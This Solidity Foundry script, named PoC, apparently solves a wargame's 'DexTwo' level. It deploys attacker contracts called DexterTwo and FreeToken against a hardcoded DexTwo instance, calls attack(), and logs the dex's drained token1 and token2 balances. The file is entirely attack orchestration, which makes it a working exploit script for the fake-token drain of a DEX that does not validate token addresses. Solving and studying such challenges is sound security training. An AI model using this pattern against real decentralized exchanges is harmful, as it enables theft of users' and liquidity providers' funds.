// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {FreeToken, DexterTwo} from "../src/23_DexTwo.sol";

interface IDexTwo {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function balanceOf(
        address token,
        address owner
    ) external view returns (uint256);
}

contract PoC is Script {
    IDexTwo dexTwo = IDexTwo(0x56aA45E6eAA6178623B662e49eeb77c44d64e900); // Replace with you DexTwo instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        // 1. Deploy our DexterTwo contract
        DexterTwo dexterTwo = new DexterTwo(address(dexTwo));
        // 2. Deploy our FreeToken contract
        FreeToken freeToken = new FreeToken(address(dexterTwo));

        // 3. Set address of FreeToken inside DexterTwo
        dexterTwo.setFreeToken(address(freeToken));

        // 4. Call the attack function
        dexterTwo.attack();

        console2.log(
            "DexTwo token1 balance: ",
            dexTwo.balanceOf(dexTwo.token1(), address(dexTwo))
        );
        console2.log(
            "DexTwo token2 balance: ",
            dexTwo.balanceOf(dexTwo.token2(), address(dexTwo))
        );

        vm.stopBroadcast();
    }
}
